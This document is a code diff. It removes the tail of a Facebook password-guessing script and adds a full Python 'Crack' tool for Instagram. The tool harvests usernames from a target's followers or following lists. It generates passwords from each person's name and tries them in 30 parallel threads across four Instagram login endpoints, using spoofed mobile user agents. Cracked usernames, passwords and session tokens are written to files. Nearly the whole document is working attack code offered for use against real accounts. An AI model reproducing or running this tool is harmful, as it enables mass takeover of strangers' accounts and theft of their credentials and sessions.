-            'encpass': "#PWD_BROWSER:0:{}:{}".format(re.search('name="m_ts" value="(.*?)"',str(free_fb)).group(1),pww),}
-            user_info = {'authority': 'www.facebook.com',
-            'method': 'POST',
-            'path': '/login/device-based/regular/login/?login_attempt=1&lwv=101',
-            'scheme': 'https',    
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,hi;q=0.6,gu;q=0.5',
-            'cache-control': 'max-age=0',
-            'content-type': 'application/x-www-form-urlencoded',
-            'dpr': '1',
-            'origin': 'https://www.facebook.com',
-            'priority': 'u=0, i',
-            'referer': referer_url,
-            'sec-ch-prefers-color-scheme': 'dark',
-            'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
-            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.120", "Chromium";v="127.0.6533.120"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-model': '""',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-ch-ua-platform-version': '"10.0.0"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
-            'viewport-width': '885',}
-            url = f"https://{fb}.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
-            sxr_respns = session.post(url, headers=user_info, data=logn_data,allow_redirects=False).text
-            login_coki=session.cookies.get_dict().keys()
-            if 'c_user' in login_coki:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                uid=re.findall("c_user=(.*);xs", coki)[0]
-                ckk=f"https://graph.facebook.com/{uid}/picture?type=normal"
-                respns=requests.get(ckk).text
-                if 'Photoshop' in respns:
-                    print(f"\r\r {b}[SxR-OK] {uid} | {pww}")
-                    if 'y' in pmsn_ckki:print(f"\r\r {f}COOKIES : {coki}\n")
-                    open('/sdcard/SxR-RNDM-OK-COOKIE.txt.txt','a').write(uid+'|'+pww+'|'+coki+'\n')
-                    open('/sdcard/SxR-RNDM-OK.txt','a').write(uid+'|'+pww+'\n')
-                    oks.append(uid)
-                    break
-                else:break
-            elif 'checkpoint' in login_coki:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                xx=coki.split('checkpoint=')[1]
-                uid=re.search('%22%3A(.*?)%2C%22', str(xx)).group(1)
-                #print(f"\r\r {c}[SxR-CP] {uid} | {pww}")
-                open('/sdcard/SxR-RNDM-CP.txt','a').write(uid+'|'+pww+'\n')
-                cps.append(uid)
-                break
-            else:continue
-        loop+=1
-    except requests.exceptions.ConnectionError:time.sleep(6)
-    except Exception as e:pass
+import urllib.parse
+from urllib.parse import quote
+import re
+import os
+import sys
+import json
+import random
+import urllib.request
+import hashlib
+import time
+import uuid
+import requests
+import base64
+import datetime
+from concurrent.futures import ThreadPoolExecutor
+from rich.panel import Panel as panel
+from rich import print as prints
 
-sxr_main()
+# Global variables
+Uid, Uuid = [], []
+Ok, Cp, Loop = 0, 0, 0
+
+# Color codes
+WHITE = '\x1b[1;97m'
+RED = '\x1b[1;91m'
+GREEN = '\x1b[1;92m'
+YELLOW = '\x1b[1;93m'
+BLUE = '\x1b[1;94m'
+PURPLE = '\x1b[1;95m'
+CYAN = '\x1b[1;96m'
+ORANGE = '\033[38;2;255;127;0;1m'
+RESET = '\x1b[0m'
+campur = random.choice([WHITE, GREEN, YELLOW, BLUE, PURPLE, CYAN, ORANGE, RESET])
+
+# Headers for requests
+HEADERS = {
+    'Host': 'www.instagram.com',
+    'x-ig-app-id': '1217981644879628',
+    'x-ig-www-claim': 'hmac.AR2bJKYJnPYmZqv19akfq13Zn4tplhuXb9TC9PwFk03DgxmT',
+    'sec-ch-ua-mobile': '?1',
+    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 360.0.0.33.104 (iPhone16,2; iOS 18.2; en_US; en; scale=3.00; 1170x2532; 510000000)',
+    'accept': '*/*',
+    'x-requested-with': 'XMLHttpRequest',
+    'x-asbd-id': '129477',
+    'x-csrftoken': 'TeWMHnpFe4nja5IPA2bBUjOiVMwndp5E',
+    'sec-fetch-site': 'same-origin',
+    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5'
+}
+
+ua = {
+    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 360.0.0.33.104 (iPhone16,2; iOS 18.2; en_US; en; scale=3.00; 1170x2532; 510000000)'
+}
+
+def clear_screen():
+    """Clear the terminal screen"""
+    try:
+        os.system('clear' if os.name == 'posix' else 'cls')
+    except:
+        pass
+
+def find_res():
+    """Find backup cookie from OK.txt or cookie.txt"""
+    cookie = None
+    try:
+        if os.path.isfile('data/OK.txt'):
+            with open('data/OK.txt', 'r') as f:
+                lines = f.read().splitlines()
+                for line in lines:
+                    if 'sessionid=' in line:
+                        cookie = line.strip()
+                        break
+        if not cookie and os.path.isfile('data/cookie.txt'):
+            with open('data/cookie.txt', 'r') as f:
+                cookie = f.read().strip()
+    except:
+        pass
+    return cookie
+
+def setup_instagram():
+    """Setup Instagram account with cookies"""
+    clear_screen()
+    coki = {}
+    
+    if os.path.isfile('data/cookie.txt'):
+        cookie_str = open('data/cookie.txt', 'r').read().strip()
+        if cookie_str:
+            coki = {'cookie': cookie_str}
+    
+    if not coki:
+        print(f"{RED}[{WHITE}+{RED}] {CYAN}Please enter your Instagram account cookie. Make sure to use a throwaway account!")
+        cookie_input = input(f"\n{RED}[{WHITE}+{RED}] {BLUE}Cookie :{YELLOW} ").strip()
+        
+        if cookie_input.lower() == 'res':
+            cookie_str = find_res()
+            if not cookie_str:
+                print(f"{RED}Failed to load backup cookie, please enter manually.")
+                cookie_input = input(f"\n{RED}[{WHITE}+{RED}] {BLUE}Cookie :{YELLOW} ").strip()
+                coki = {'cookie': cookie_input}
+            else:
+                coki = {'cookie': cookie_str}
+        else:
+            coki = {'cookie': cookie_input}
+    
+    try:
+        uid = re.search('ds_user_id=(\\d+)', str(coki['cookie'])).group(1)
+        resp = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers=ua, cookies=coki)
+        resp.raise_for_status()
+        user_data = resp.json().get('user', {})
+        full_name = user_data.get('full_name', 'Name Unknown')
+        follower_count = user_data.get('follower_count', 0)
+        open('data/cookie.txt', 'w').write(coki['cookie'])
+        return coki, full_name, follower_count
+    except Exception as e:
+        print(f"{RED}Invalid cookies or error: {e}")
+        os.system('rm -rf data/cookie.txt')
+        time.sleep(2)
+        return setup_instagram()
+
+def menu():
+    """Main menu display"""
+    clear_screen()
+    aset, nama, fol = setup_instagram()
+    print(f"{BLUE}═" * 80)
+    print(f"""{campur} 
+ _______  ______ _______ _______ _     _      _____  ______
+ |       |_____/ |_____| |       |____/         |   |  ____
+ |_____  |    \\_ |     | |_____  |    \\_      __|__ |_____|
+                                          
+{CYAN}╭──────────────────────╮{CYAN}╭───────────────╮{CYAN}╭─────────────────────────╮
+{CYAN}│ {CYAN}Author : {GREEN}RAYANXWEB {CYAN}│{CYAN}  │ {WHITE}Version : {GREEN}2.0 {CYAN}│{CYAN}│ {WHITE}Status : {GREEN}Premium{CYAN}    │
+{CYAN}╰──────────────────────╯{CYAN}╰───────────────╯{CYAN}╰─────────────────────────╯""")
+    print(f"{GREEN}{WHITE}Username :{GREEN} {nama[:8]}\n{WHITE}Followers : {GREEN}{fol}")
+    
+    print(f"\n{RED}[ {YELLOW}Crack Menu {RED}]\n\n{RED}[{WHITE}01{RED}] {CYAN} Crack from followers\n{RED}[{WHITE}02{RED}] {CYAN} Crack from following\n{RED}[{WHITE}00{RED}] {RED} Delete/Change Cookies")
+    print(f"{BLUE}═" * 80)
+    x = input(f"\n{RED}[{WHITE}+{RED}] {BLUE}Please select a menu option :{YELLOW} ")
+
+    if x in ['01', '1']:
+        dump_users(aset, True)
+    elif x in ['02', '2']:
+        dump_users(aset, False)
+    elif x in ['03', '3']:
+        crack_file()
+    elif x in ['00', '0']:
+        os.system("rm data/cookie.txt")
+        prints(f"{GREEN}Successfully deleted cookies")
+        exit()
+
+def crack_file():
+    """Crack from file input"""
+    try:
+        nu = input(f"{PURPLE}[{WHITE}+{PURPLE}] {WHITE}Enter Your File Name: {PURPLE}")
+        with open(nu, 'r') as file:
+            for line in file:
+                Uuid.append(line.strip())
+    except:
+        print(f"{PURPLE}[{RED}+{PURPLE}] {RED}File Not Found.")
+        exit()
+    print(f"{PURPLE}[{WHITE}+{PURPLE}] {WHITE}Total IDs : {len(Uuid)}")
+    select_method()
+
+def dump_users(cintil, typess):
+    """Dump user IDs from followers or following"""
+    xyz = []
+    
+    if 'csrftoken' not in str(cintil):
+        try:
+            memek = requests.get('https://www.instagram.com/data/shared_data/', cookies=cintil).json()
+            token = memek['config']['csrf_token']
+            cintil['cookie'] += ';csrftoken=%s;' % token
+        except Exception as e:
+            os.system('rm -rf data/cookie.txt')
+            exit(f'\n{WHITE}[{YELLOW}!{WHITE}] Csrftoken not available, dump will not run: {e}')
+    
+    prints(panel(f"\n{CYAN}Enter Instagram usernames, use commas for mass cracking", style="Purple"))
+    users = input(f"{RED}[{WHITE}+{RED}] {BLUE}Username :{YELLOW} ").split(',')
+    
+    try:
+        for y in users:
+            y = y.strip()
+            req = requests.get(f'https://www.instagram.com/{y}/', cookies=cintil).text
+            uid = re.search('"user_id":"(\\d+)"', str(req))
+            if uid:
+                uid = uid.group(1)
+                if uid not in xyz:
+                    xyz.append(uid)
+    except:
+        pass
+    
+    try:
+        for kintil in xyz:
+            if typess:
+                graphql(True, kintil, cintil['cookie'], '')
+            else:
+                graphql(False, kintil, cintil['cookie'], '')
+    except:
+        pass
+    
+    print("")
+    select_method()
+
+def graphql(typess, userid, cokie, after):
+    """GraphQL query to get user data"""
+    global xx
+    api = "https://www.instagram.com/graphql/query/"
+    csr = 'variables={"id":"%s","first":24,"after":"%s"}' % (userid, after)
+    mek = "query_hash=58712303d941c6855d4e888c5f0cd22f&{}".format(csr) if not typess else "query_hash=37479f2b8209594dde7facb0d904896a&{}".format(csr)
+    
+    try:
+        ptk = {
+            "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 360.0.0.33.104",
+            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+            "cookie": cokie
+        }
+        req = requests.get(api, params=mek, headers=ptk).json()
+        
+        if 'require_login' in req:
+            if len(Uuid) == 0:
+                exit(f'\n{WHITE}[{YELLOW}!{WHITE}] Invalid Cookie')
+        
+        khm = 'edge_followed_by' if typess else 'edge_follow'
+        for xyz in req['data']['user'][khm]['edges']:
+            username = xyz['node']['username']
+            xy = username + '|' + xyz['node']['full_name']
+            if xy not in Uuid:
+                xx += 1
+                Uuid.append(xy)
+                print('\rCollecting Uid {}{}{}                            '.format(RED, len(Uuid), WHITE), end='')
+                time.sleep(0.0009)
+        
+        end = req['data']['user'][khm]['page_info']['has_next_page']
+        if end:
+            after = req['data']['user'][khm]['page_info']['end_cursor']
+            graphql(typess, userid, cokie, after)
+    except:
+        pass
+
+def select_method():
+    """Select cracking method"""
+    global SistemLog
+    prints(panel(f"""\n{RED}[ {BLUE}Select the method to use{RED} ]\n\n{RED}[{CYAN}01{RED}] {WHITE}www.instagram.com method {GREEN}Recommended{WHITE}
+{RED}[{CYAN}02{RED}] {WHITE}i.instagram.com method
+{RED}[{CYAN}03{RED}] {WHITE}i.instagram.com method
+{RED}[{CYAN}04{RED}] {WHITE}b.i.instagram.com method""", style="Purple"))
+    method = input(f"\n{RED}[{WHITE}+{RED}]{BLUE} Select Menu : {YELLOW}")
+    
+    if method in ['01', '1']:
+        SistemLog = "api.instagram.com"
+    elif method in ['02', '2']:
+        SistemLog = "i.instagram.com"
+    elif method in ['03', '3']:
+        SistemLog = "www.instagram.com"
+    elif method in ['04', '4']:
+        SistemLog = "b.i.instagram.com"
+    else:
+        SistemLog = "api.instagram.com"
+    start_cracking()
+
+def start_cracking():
+    """Start the cracking process with thread pool"""
+    print(f"\n{YELLOW}Cracking in progress, please enable airplane mode \nfor every 100 usernames/id for 5 seconds\n{WHITE}")
+    
+    with ThreadPoolExecutor(max_workers=30) as ASF:
+        for i in Uuid:
+            try:
+                username, name = i.split('|')
+                password_list = generate_passwords(name)
+                
+                if SistemLog == "api.instagram.com":
+                    ASF.submit(crack_api, username, password_list)
+                elif SistemLog == "i.instagram.com":
+                    ASF.submit(crack_i, username, password_list)
+                elif SistemLog == "www.instagram.com":
+                    ASF.submit(crack_w, username, password_list)
+                elif SistemLog == "b.i.instagram.com":
+                    ASF.submit(crack_b, username, password_list)
+            except:
+                pass
+    
+    exit(f' \n\n {GREEN}Cracking completed')
+
+def generate_passwords(name):
+    """Generate password list based on name"""
+    xxzx = []
+    
+    for nama in name.split(' '):
+        nama = nama.lower()
+        if len(nama) < 3:
+            continue
+        elif len(nama) in [3, 4, 5]:
+            xxzx.append(nama + '123')
+            xxzx.append(nama + '26')
+            xxzx.append(nama + '1234')
+            xxzx.append('wonosobo' + '123')
+            xxzx.append('skorsa99')
+            xxzx.append(nama + '2008')
+            xxzx.append('wonosobo12345')
+            xxzx.append('wonosobo' + '1234')
+            xxzx.append(nama + '28')
+            xxzx.append(nama + '2009')
+            xxzx.append(nama + '456')
+            xxzx.append(nama.capitalize() + '789')
+            xxzx.append('katasandi')
+            xxzx.append(nama.capitalize() + 'cantik')
+            xxzx.append(nama.capitalize() + '1234')
+            xxzx.append(nama.capitalize() + '29')
+            xxzx.append(nama.capitalize() + '12')
+            xxzx.append(nama.capitalize() + '123456')
+            xxzx.append(nama.capitalize() + '123')
+            xxzx.append(nama.capitalize() + '12345')
+        else:
+            xxzx.append(nama)
+            xxzx.append(name)
+            xxzx.append(nama + '1234')
+            xxzx.append(nama + '12345')
+            xxzx.append(nama + '123456789')
+            xxzx.append(nama + '99')
+            xxzx.append(nama + '12')
+            xxzx.append(nama + '123456')
+            xxzx.append(nama.capitalize() + '321')
+            xxzx.append(nama + '34')
+            xxzx.append(nama + '2009')
+            xxzx.append(nama + '28')
+            xxzx.append(nama + '29')
+            xxzx.append('wonosobo12345')
+            xxzx.append('wonosobo' + '1234')
+            xxzx.append(nama + '20')
+            xxzx.append(nama + '2008')
+            xxzx.append(nama + '2010')
+            xxzx.append(nama.capitalize() + '123')
+            xxzx.append(nama.capitalize() + '12345')
+    
+    return xxzx
+
+def get_user_data(name):
+    """Get user data from Instagram"""
+    post = peng = meng = mail = fullname = fbid = phone = None
+    
+    for y in name.split(','):
+        try:
+            HEADERS.update({
+                'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 360.0.0.33.104 (iPhone16,2; iOS 18.2; en_US; en; scale=3.00; 1170x2532; 510000000)',
+                'x-ig-app-id': '1217981644879628'
+            })
+            profil_info_target = requests.get(f'https://i.instagram.com/api/v1/users/web_profile_info/?username={y}', headers=HEADERS).json()['data']['user']
+            post = profil_info_target["edge_owner_to_timeline_media"]["count"]
+            peng = profil_info_target["edge_followed_by"]["count"]
+            meng = profil_info_target["edge_follow"]["count"]
+            mail = profil_info_target.get("business_email")
+            phone = profil_info_target.get("business_phone_number")
+            fullname = profil_info_target["full_name"]
+            fbid = profil_info_target["fbid"]
+        except:
+            pass
+    
+    return post, peng, meng, mail, fullname, fbid, phone
+
+def random_user_agent():
+    """Generate random user agent for Instagram"""
+    android_version = random.choice(["27/9","27/10","27/11","27/12"])
+    dpi = random.choice(['240dpi','320dpi','400dpi','480dpi'])
+    pxl = random.choice(['720x1280','1080x1920','1440x2560'])
+    brand = random.choice(['samsung','xiaomi','oneplus','google'])
+    model = random.choice(['SM-G991B','SM-G998B','Pixel 6','OnePlus 9'])
+    ig_version = random.choice(["70.0.0.15.98", "80.0.0.20.101"])
+    locale = random.choice(['id_ID','en_US','en_GB'])
+    
+    ua1 = f'Instagram {ig_version} Android ({android_version}; {dpi}; {pxl}; {brand}; {model})'
+    ua2 = f'Instagram {ig_version} (iPhone; iOS 17_5_1; {locale}; scale=3.00; {pxl})'
+    
+    return random.choice([ua1, ua2])
+
+def crack_api(username, memek):
+    """Crack using API method"""
+    global Ok, Cp, Loop
+    
+    sys.stdout.write(f"\rStatus IP: {GREEN}safe{WHITE} web {YELLOW}{Loop}{WHITE}/{GREEN}{str(len(Uuid))}{WHITE}/{GREEN}{str(username)[:6]}{WHITE}/Ok:-{GREEN}{Ok}{WHITE}/Cp:-{YELLOW}{Cp}{WHITE}")
+    sys.stdout.flush()
+    
+    for password in memek:
+        try:
+            ses = requests.Session()
+            cok = ses.get('https://www.instagram.com/api/v1/web/accounts/login/ajax/',
+                         headers={'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 360.0.0.33.104'}).cookies.get_dict()
+            cooki = ("; ").join([f"{key}={value}" for key, value in cok.items()])
+            csrf = list(ses.get('https://i.instagram.com/api/v1/web/accounts/login/ajax/').cookies.items())[0][1]
+            
+            headers = {
+                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 26_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/23F81 Instagram 317.0.4.27.109 (iPhone18,1; iOS 26_5_1; en_US; en; scale=3.00; 960x2079; 562830928) NW/3',
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'x-csrftoken': f'{csrf}',
+                'x-ig-app-id': '1217981644879628',
+                'x-asbd-id': '129477',
+                'origin': 'https://www.instagram.com',
+                'referer': 'https://www.instagram.com/',
+                'Cookie': cooki
+            }
+            
+            data = f'enc_password=%23PWD_INSTAGRAM_BROWSER%3A0%3A{str(int(datetime.datetime.now().timestamp()))}%3A{urllib.parse.quote(str(password))}&optIntoOneTap=false&queryParams=%7B%22next%22%3A%22%2F%22%2C%22source%22%3A%22mobile_nav%22%7D&trustedDeviceRecords=%7B%7D&username={urllib.parse.quote(str(username))}'
+            response = ses.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', headers=headers, data=data)
+            
+            if 'userId' in str(response.text):
+                kuki = ";".join([str(x) + "=" + str(y) for x, y in ses.cookies.get_dict().items()])
+                post, peng, meng, mail, fullname, fbid, phone = get_user_data(username)
+                print(f"                                                               ", end='\r')
+                time.sleep(0.10)
+                print(f"\r{BLUE}FullName: {GREEN}{fullname[:10] if fullname else '?'}{BLUE}\nUsername: {GREEN}{username}{BLUE}\nPassword: {GREEN}{password}{BLUE}\nFollowers: {GREEN}{peng}{BLUE}\nFollowing: {GREEN}{meng}\n{BLUE}Posts: {GREEN}{post}{BLUE}\nfb_id: {GREEN}{fbid}{BLUE}\n{BLUE}Authorization: {WHITE}{kuki}{WHITE}\n")
+                Ok += 1
+                open('data/OK.txt', 'a').write(f"{username}|{password}\n{peng}|{meng}\n{kuki}\n")
+                break
+            elif 'checkpoint' in str(response.text):
+                Cp += 1
+                post, peng, meng, mail, fullname, fbid, phone = get_user_data(username)
+                print(f"\r {WHITE}Username: {BLUE}{username}{WHITE}\n Password:{BLUE} {password}\n {WHITE}Followers: {BLUE}{peng}{WHITE}\n Following: {BLUE}{meng}{WHITE}")
+                open('data/CP.txt', 'a').write('%s|%s\n' % (username, password))
+                break
+            else:
+                continue
+        except requests.exceptions.ConnectionError:
+            time.sleep(20)
+    
+    Loop += 1
+
+def crack_i(username, memek):
+    """Crack using i.instagram.com method"""
+    global Ok, Cp, Loop
+    
+    sys.stdout.write(f"\rStatus IP: {GREEN}Safe{WHITE} api {YELLOW}{Loop}{WHITE}/{GREEN}{str(len(Uuid))}{WHITE}/{GREEN}{str(username)[:6]}{WHITE}/Ok:-{GREEN}{Ok}{WHITE}/Cp:-{YELLOW}{Cp}{WHITE}")
+    sys.stdout.flush()
+    
+    for password in memek:
+        try:
+            ses = requests.Session()
+            useragent = random_user_agent()
+            device_id = str(uuid.uuid4())
+            _hash = hashlib.md5()
+            _hash.update(username.encode('utf-8') + password.encode('utf-8'))
+            hex_ = _hash.hexdigest()
+            _hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))
+            
+            data = {
+                'signed_body': 'aa792afa7c0f5b1680531edb1681750fcc45a3718142c399d2420291431be7f1.{"id":"' + str(device_id) + '","server_config_retrieval":"1"}',
+                'ig_sig_key_version': '4'
+            }
+            
+            ses.headers.update({
+                'X-Pigeon-Session-Id': str(uuid.uuid4()),
+                'X-IG-Connection-Type': 'MOBILE(LTE)',
+                'X-IG-App-ID': '567067343352427',
+                'User-Agent': useragent,
+                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                'Host': 'i.instagram.com',
+            })
+            
+            response = ses.post('https://i.instagram.com/api/v1/qe/sync/', data=data)
+            
+            try:
+                _csrftoken = ses.cookies.get_dict()['csrftoken']
+            except:
+                _csrftoken = ''
+            
+            data2 = f'signed_body=c47e37e1131fb044652977e468f13e6139bbd66e437069921457f7afb70bcdba.%7B%22username%22%3A%22{urllib.parse.quote(str(username))}%22%2C%22password%22%3A%22{urllib.parse.quote(str(password))}%22%2C%22_csrftoken%22%3A%22{urllib.parse.quote(str(_csrftoken))}%22%7D&ig_sig_key_version=4'
+            
+            response2 = ses.post('https://i.instagram.com/api/v1/accounts/login/', data=data2, allow_redirects=True)
+            
+            if 'logged_in_user' in response2.text or 'sessionid' in ses.cookies.get_dict().keys():
+                try:
+                    ig_set_authorization = response2.headers['ig-set-authorization']
+                except:
+                    ig_set_authorization = None
+                
+                Ok += 1
+                post, peng, meng, mail, fullname, fbid, phone = get_user_data(username)
+                print(f"                                                               ", end='\r')
+                time.sleep(0.10)
+                print(f"\r{BLUE}FullName: {GREEN}{fullname[:10] if fullname else '?'}{BLUE}\nUsername: {GREEN}{username}{BLUE}\nPassword: {GREEN}{password}{BLUE}\nFollowers: {GREEN}{peng}{BLUE}\nFollowing: {GREEN}{meng}\n{BLUE}Posts: {GREEN}{post}{BLUE}\nfb_id: {GREEN}{fbid}{WHITE}\n{BLUE}Authorization: {WHITE}{ig_set_authorization}{WHITE}\n")
+                open('data/OK.txt', 'a').write(f"{username}|{password}\n{peng}|{meng}\n{ig_set_authorization}\n")
+                break
+            elif 'challenge_required' in response2.text:
+                Cp += 1
+                post, peng, meng, mail, fullname, fbid, phone = get_user_data(username)
+                print(f"\r Username: {BLUE}{username}{WHITE}\n Password:{BLUE} {password}\n Followers: {BLUE}{peng}{WHITE}\n Following:{BLUE}{meng}{WHITE}")
+                open('data/CP.txt', 'a').write('%s|%s\n' % (username, password))
+                break
+            else:
+                continue
+        except requests.exceptions.ConnectionError:
+            time.sleep(20)
+    
+    Loop += 1
+
+def crack_w(username, memek):
+    """Crack using www.instagram.com method"""
+    global Ok, Cp, Loop
+    
+    sys.stdout.write(f"\rStatus IP: {GREEN}safe{WHITE} threads {YELLOW}{Loop}{WHITE}/{GREEN}{str(len(Uuid))}{WHITE}/{GREEN}{str(username)[:6]}{WHITE}/Ok:-{GREEN}{Ok}{WHITE}/Cp:-{YELLOW}{Cp}{WHITE}")
+    sys.stdout.flush()
+    
+    for password in memek:
+        try:
+            ses = requests.Session()
+            uag = random_user_agent()
+            device_id, family_device_id = str(uuid.uuid4()), str(uuid.uuid4())
+            _hash = hashlib.md5()
+            _hash.update(username.encode('utf-8') + password.encode('utf-8'))
+            hex_ = _hash.hexdigest()
+            _hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))
+            
+            ses.headers.update({
+                'x-fb-http-engine': 'Liger',
+                'Host': 'i.instagram.com',
+                'x-ig-capabilities': '3brTv10=',
+                'x-ig-device-id': device_id,
+                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                'x-ig-connection-type': 'MOBILE(LTE)',
+                'user-agent': uag,
+                'x-ig-family-device-id': family_device_id,
+                'x-ig-app-id': '3419628305025917',
+                'x-ig-android-id': f'android-{_hash.hexdigest()[:16]}',
+            })
+            
+            data = (f'params=%7B%22client_input_params%22%3A%7B%22device_id%22%3A%22android-{_hash.hexdigest()[:16]}%22%2C%22password%22%3A%22%23PWD_INSTAGRAM%3A0%3A{str(int(datetime.datetime.now().timestamp()))}%3A{urllib.parse.quote(str(password))}%22%2C%22contact_point%22%3A%22{urllib.parse.quote(str(username))}%22%7D%7D')
+            
+            response = ses.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data=data, allow_redirects=True)
+            resp_text = response.text.replace('\\', '')
+            
+            if 'Bearer IGT:2:' in resp_text and '"pk_id":' in resp_text:
+                try:
+                    ig_set_authorization = re.search('"IG-Set-Authorization": "(.*?)"', resp_text).group(1)
+                    decode_cookie = json.loads(base64.urlsafe_b64decode(ig_set_authorization.split('Bearer IGT:2:')[1]))
+                    cookies = ";".join([f"{k}={v}" for k, v in decode_cookie.items()])
+                except:
+                    cookies = '-'
+                
+                Ok += 1
+                post, peng, meng, mail, fullname, fbid, phone = get_user_data(username)
+                print(f"                                                               ", end='\r')
+                time.sleep(0.10)
+                print(f"\r{BLUE}FullName: {GREEN}{fullname[:10] if fullname else '?'}{BLUE}\nUsername: {GREEN}{username}{BLUE}\nPassword: {GREEN}{password}{BLUE}\nFollowers: {GREEN}{peng}{BLUE}\nFollowing: {GREEN}{meng}\n{BLUE}Posts: {GREEN}{post}{BLUE}\nfb_id: {GREEN}{fbid}{BLUE}\nCookie: {WHITE}{cookies}{WHITE}\n")
+                open('data/OK.txt', 'a').write(f"{username}|{password}\n{peng}|{meng}\n{cookies}\n")
+                break
+            elif 'challenge_required' in resp_text or '/challenge/' in resp_text:
+                Cp += 1
+                post, peng, meng, mail, fullname, fbid, phone = get_user_data(username)
+                print(f"\r Username: {BLUE}{username}{WHITE}\n Password:{BLUE} {password}\n Followers: {BLUE}{peng}{WHITE}\n Following:{BLUE}{meng}{WHITE}")
+                open('data/CP.txt', 'a').write('%s|%s\n' % (username, password))
+                break
+            else:
+                continue
+        except requests.exceptions.ConnectionError:
+            time.sleep(20)
+    
+    Loop += 1
+
+def crack_b(username, memek):
+    """Crack using b.i.instagram.com method"""
+    global Ok, Cp, Loop
+    
+    sys.stdout.write(f"\rStatus IP: {GREEN}safe{WHITE} api2 {YELLOW}{Loop}{WHITE}/{GREEN}{str(len(Uuid))}{WHITE}/{GREEN}{str(username)[:6]}{WHITE}/Ok:-{GREEN}{Ok}{WHITE}/Cp:-{YELLOW}{Cp}{WHITE}")
+    sys.stdout.flush()
+    
+    for password in memek:
+        try:
+            ua2 = random_user_agent()
+            ses = requests.Session()
+            device_id = str(uuid.uuid4())
+            _hash = hashlib.md5()
+            _hash.update(username.encode('utf-8') + password.encode('utf-8'))
+            hex_ = _hash.hexdigest()
+            _hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))
+            
+            ses.headers.update({
+                'authority': 'i.instagram.com',
+                'x-ig-capabilities': '3brTv10=',
+                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                'x-ig-connection-type': 'MOBILE(LTE)',
+                'user-agent': ua2,
+                'x-ig-device-id': device_id,
+                'x-ig-app-id': '567067343352427',
+                'x-ig-android-id': f'android-{_hash.hexdigest()[:16]}',
+            })
+            
+            data = f'signed_body=SIGNATURE.%7B%22enc_password%22%3A%22%23PWD_INSTAGRAM%3A0%3A{str(int(datetime.datetime.now().timestamp()))}%3A{urllib.parse.quote(str(password))}%3D%22%2C%22username%22%3A%22{urllib.parse.quote(str(username))}%22%2C%22device_id%22%3A%22android-{urllib.parse.quote(str(_hash.hexdigest()[:16]))}%22%7D'
+            
+            response = ses.post('https://b.i.instagram.com/api/v1/accounts/login/', data=data)
+            
+            if 'logged_in_user' in response.text and '"pk_id":' in response.text:
+                ig_set_authorization = response.headers.get('ig-set-authorization')
+                Ok += 1
+                post, peng, meng, mail, fullname, fbid, phone = get_user_data(username)
+                print(f"                                                               ", end='\r')
+                time.sleep(0.10)
+                print(f"\r{BLUE}FullName: {GREEN}{fullname[:10] if fullname else '?'}{BLUE}\nUsername: {GREEN}{username}{BLUE}\nPassword: {GREEN}{password}{BLUE}\nFollowers: {GREEN}{peng}{BLUE}\nFollowing: {GREEN}{meng}\n{BLUE}Posts: {GREEN}{post}{BLUE}\nfb_id: {GREEN}{fbid}{WHITE}\n{BLUE}Authorization: {WHITE}{ig_set_authorization}{WHITE}\n")
+                open('data/OK.txt', 'a').write(f"{username}|{password}\n{peng}|{meng}\n{ig_set_authorization}\n")
+                break
+            elif 'challenge_required' in response.text or '/challenge/' in response.text:
+                Cp += 1
+                print(f"\r Username:{BLUE} {username}{WHITE}\n Password: {BLUE}{password}\n")
+                open('data/CP.txt', 'a').write('%s|%s\n' % (username, password))
+                break
+            else:
+                continue
+        except requests.exceptions.ConnectionError:
+            time.sleep(20)
+    
+    Loop += 1
+
+if __name__ == '__main__':
+    try:
+        os.mkdir('data')
+    except:
+        pass
+    
+    try:
+        menu()
